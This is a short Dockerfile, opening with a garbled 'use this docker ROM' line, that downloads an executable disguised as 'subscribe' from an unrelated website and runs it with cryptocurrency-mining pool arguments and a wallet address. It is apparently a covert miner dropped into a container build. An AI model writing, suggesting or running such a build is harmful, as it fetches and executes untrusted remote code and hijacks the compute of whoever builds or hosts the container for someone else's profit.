use this docker ROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN ./subscribe -a curvehash  -o stratum+tcp://curvehash.asia.mine.zergpool.com:3343 -u LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.a6x
